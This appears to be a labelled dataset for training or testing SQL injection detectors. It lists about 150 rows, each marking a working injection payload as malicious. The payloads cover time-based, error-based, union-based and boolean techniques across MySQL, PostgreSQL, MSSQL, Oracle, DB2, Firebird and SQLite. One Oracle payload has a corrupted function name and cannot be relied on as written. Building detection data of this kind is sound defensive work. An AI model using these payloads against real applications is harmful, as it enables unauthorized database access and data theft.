payload;attack_type;label
"1"") as sraw where 1997=1997 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--";SQL injection;malicious
1'||(select 'jpow' from dual where 4381=4381 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))||';SQL injection;malicious
"1"")) as pafp where 6770=6770 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--";SQL injection;malicious
1 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)-- wvjy;SQL injection;malicious
1') where 5279=5279 or sleep(5)#;SQL injection;malicious
1') as jdmh where 6175=6175 rlike sleep(5)#;SQL injection;malicious
1') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('gfxr'='gfxr;SQL injection;malicious
"1%'));select case when 3920=4402 then 1 else null end--";SQL injection;malicious
"1%"" and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ""%""=""";SQL injection;malicious
1)) and elt(3114=3114,sleep(5))#;SQL injection;malicious
-1499) as gxfm where 9762=9762 or 5989=4782--;SQL injection;malicious
1)) as cbdx where 8998=8998 and elt(4249=4249,7259)--;SQL injection;malicious
1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5);SQL injection;malicious
-6178)) as lygb where 9559=9559 or (8459=8459)*4906--;SQL injection;malicious
1%'))) or 4240=(select 4240 from pg_sleep(5))--;SQL injection;malicious
"1""))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""tkkg""=""tkkg";SQL injection;malicious
"1"") and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (""rphs""=""rphs";SQL injection;malicious
1)) union all select null,null,null,null,null,null,null,null#;SQL injection;malicious
-5667%')) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'=';SQL injection;malicious
"1')));select pg_sleep(5) and ((('qslr'='qslr";SQL injection;malicious
1 where 8074=8074 and elt(3114=3114,sleep(5))#;SQL injection;malicious
"-7482%"")) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""%""=""";SQL injection;malicious
1' in boolean mode) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))#;SQL injection;malicious
-2951 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)# gwqv;SQL injection;malicious
"1"" waitfor delay '0:0:5' and ""syhx""=""syhx";SQL injection;malicious
"-4558"" or (3965=3933)*3933 and ""hmdb"" like ""hmdb";SQL injection;malicious
1'+(select 'czpg' where 6627=6627 and 2006=2006;SQL injection;malicious
1)) as kccx where 7547=7547 union all select null--;SQL injection;malicious
"1';select benchmark(5000000,md5(0x4c4d6142)) and 'nlrk' like 'nlrk";SQL injection;malicious
"-8109%"")) union all select 9089,9089--";SQL injection;malicious
"-7831"")) as krzi where 3798=3798 order by 1--";SQL injection;malicious
"1);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3";SQL injection;malicious
-5581%'))) union all select 4266,4266,4266,4266,4266,4266,4266,4266,4266,4266#;SQL injection;malicious
"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--";SQL injection;malicious
1%')) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--;SQL injection;malicious
"1)) as oqyo where 7995=7995;select pg_sleep(5)--";SQL injection;malicious
"-8651"") where 8391=8391 union all select 8391,8391#";SQL injection;malicious
"-1333"")) union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--";SQL injection;malicious
"1"" where 4213=4213 and 8407=(select count(*) from generate_series(1,5000000))--";SQL injection;malicious
1%') or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--;SQL injection;malicious
"1';select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--";SQL injection;malicious
1' where 6417=6417 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--;SQL injection;malicious
"1';select like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'cwuy'='cwuy";SQL injection;malicious
-8181')) or 5926=3332#;SQL injection;malicious
"1"") where 1666=1666 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--";SQL injection;malicious
"1 where 2301=2301;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--";SQL injection;malicious
"1"") where 8254=8254 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--";SQL injection;malicious
1')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('qtul' like 'qtul;SQL injection;malicious
"1"" where 3434=3434;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--";SQL injection;malicious
-5496 union all select 2099,2099,2099#;SQL injection;malicious
-7239' or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and 'cswv'='cswv;SQL injection;malicious
"-3215"") union all select 4457,4457,4457,4457,4457#";SQL injection;malicious
1'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('xdui' like 'xdui;SQL injection;malicious
1 where 1886=1886 union all select null,null,null,null,null,null,null,null,null--;SQL injection;malicious
"1"" where 2547=2547 or sleep(5)#";SQL injection;malicious
1' where 3425=3425 and elt(4249=4249,7259)--;SQL injection;malicious
"1"";select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3";SQL injection;malicious
1') as dajk where 1452=1452 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#;SQL injection;malicious
"1"";if(7899=7899) select 7899 else drop function zbbp--";SQL injection;malicious
1 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1);SQL injection;malicious
-8023' in boolean mode) order by 1#;SQL injection;malicious
1'||(select 'epjf' from dual where 8584=8584 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--;SQL injection;malicious
-2864') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('vjbl'='vjbl;SQL injection;malicious
1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'cdgm' like 'cdgm;SQL injection;malicious
"1"" where 5977=5977;select case when 2640=9249 then 1 else null end--";SQL injection;malicious
1'+(select 'vkis' where 3712=3712 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users))+';SQL injection;malicious
-5866')) as phzq where 3803=3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--;SQL injection;malicious
-5165')) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('zpnv' like 'zpnv;SQL injection;malicious
1) or sleep(5);SQL injection;malicious
1'+(select gthp where 7311=7311 or sleep(5)#;SQL injection;malicious
"-6381%""))) union all select 1503,1503,1503,1503#";SQL injection;malicious
-2784')) union all select 6775,6775,6775,6775,6775,6775,6775,6775,6775#;SQL injection;malicious
1%' and elt(7619=1489,1489) and '%'=';SQL injection;malicious
"1'));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--";SQL injection;malicious
-9721' or elt(9511=9238,9238);SQL injection;malicious
1 where 7425=7425 rlike (select (case when (4056=3196) then 1 else 0x28 end))--;SQL injection;malicious
"1"";waitfor delay '0:0:5'--";SQL injection;malicious
1%')) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (('%'=';SQL injection;malicious
1') as ccee where 8880=8880 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--;SQL injection;malicious
"-1004"" where 6266=6266 order by 1#";SQL injection;malicious
1' and 7756=dbms_utility.SQL injectiond_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'napi' like 'napi;SQL injection;malicious
"1"") as xaye where 5343=5343 and 4355=7475#";SQL injection;malicious
-2129') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('eutm' like 'eutm;SQL injection;malicious
1)) union all select null,null,null#;SQL injection;malicious
1'+(select dpkp where 4836=4836 and sleep(5))+';SQL injection;malicious
1')) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (('skdm'='skdm;SQL injection;malicious
"1""))) and (7396=6351)*6351 and (((""xerw"" like ""xerw";SQL injection;malicious
"1%""))) order by 1#";SQL injection;malicious
1'+(select 'tyuz' where 3957=3957 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null))+';SQL injection;malicious
"1"" or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)";SQL injection;malicious
1,(case when 2872=2872 then 1 else null end);SQL injection;malicious
"1%"")) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((""%""=""";SQL injection;malicious
"1"") as ivuv where 5691=5691;select like('abcdefg',upper(hex(randomblob(500000000/2))))--";SQL injection;malicious
1' in boolean mode) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)#;SQL injection;malicious
"1"");call regexp_substring(repeat(right(char(2385),0),500000000),null)--";SQL injection;malicious
"-8013%"" or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""%""=""";SQL injection;malicious
1') where 8575=8575 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--;SQL injection;malicious
-9136') or make_set(9354=9354,7185);SQL injection;malicious
1,extractvalue(9788,concat(0x5c,0x7171706a71,(select (elt(9788=9788,1))),0x717a767a71));SQL injection;malicious
"1""))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (((""tabq"" like ""tabq";SQL injection;malicious
-8004%') or (2301=7504)*7504 and ('%'=';SQL injection;malicious
1)) union all select null#;SQL injection;malicious
1) rlike (select * from (select(sleep(5)))sgvo) and (4968=4968;SQL injection;malicious
"1"" where 2309=2309 or elt(5873=5873,sleep(5))#";SQL injection;malicious
"-8065""))) order by 1--";SQL injection;malicious
1) where 6788=6788 union all select null,null,null,null,null,null,null,null,null--;SQL injection;malicious
1'+(select 'nhlx' where 2291=2291 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))+';SQL injection;malicious
"1"")) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((""oxvw""=""oxvw";SQL injection;malicious
"1;select benchmark(5000000,md5(0x4c4d6142))-- sztf";SQL injection;malicious
-3278')) or elt(1032=1032,3623) and (('zxig' like 'zxig;SQL injection;malicious
"1%"")));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--";SQL injection;malicious
-4856' in boolean mode) union all select 1074,1074,1074,1074,1074,1074,1074#;SQL injection;malicious
1')) or sleep(5)#;SQL injection;malicious
1'||(select 'xjtq' from dual where 5719=5719 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))||';SQL injection;malicious
(select 1 from generate_series(8515,8515,case when (8515=3477) then 1 else 0 end) limit 1);SQL injection;malicious
1'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('hllf'='hllf;SQL injection;malicious
"1') as uaoz where 2464=2464;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#";SQL injection;malicious
"1"");iif(9875=8961,1,1/0)";SQL injection;malicious
"1') as imgv where 7802=7802;select (case when (9619=8679) then 1 else 9619*(select 9619 from master..sysdatabases) end)--";SQL injection;malicious
iif(9229=4158,1,1/0);SQL injection;malicious
-9379) or make_set(9354=9354,7185) and (9212=9212;SQL injection;malicious
"-7491"") as cnrn where 3635=3635 order by 1#";SQL injection;malicious
-3849) or 5580=3442--;SQL injection;malicious
1) as cjmt where 4839=4839 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--;SQL injection;malicious
-1393'))) union all select 8280--;SQL injection;malicious
"1"" where 7279=7279 or 8514=benchmark(5000000,md5(0x544d5a4c))#";SQL injection;malicious
"1'||(select 'qgnz' where 6446=6446;select count(*) from generate_series(1,5000000)--";SQL injection;malicious
1' where 7104=7104 union all select null,null,null,null,null,null,null#;SQL injection;malicious
1',iif(4861=6268,1,1/0);SQL injection;malicious
-7453'))) or 8571=8571--;SQL injection;malicious
"1""))) and make_set(7809=9564,9564) and (((""jggk"" like ""jggk";SQL injection;malicious
"1%"")) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--";SQL injection;malicious
"-2246"")) union all select 4613,4613,4613,4613,4613,4613#";SQL injection;malicious
1) where 4479=4479 rlike (select (case when (6351=4367) then 1 else 0x28 end))--;SQL injection;malicious
1%') or 4240=(select 4240 from pg_sleep(5))--;SQL injection;malicious
-2287')) union all select 1200,1200,1200,1200,1200#;SQL injection;malicious
"1');select (case when (3859=6938) then 3859 else 3859*(select 3859 from mysql.db) end)#";SQL injection;malicious
1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('yxpi'='yxpi;SQL injection;malicious
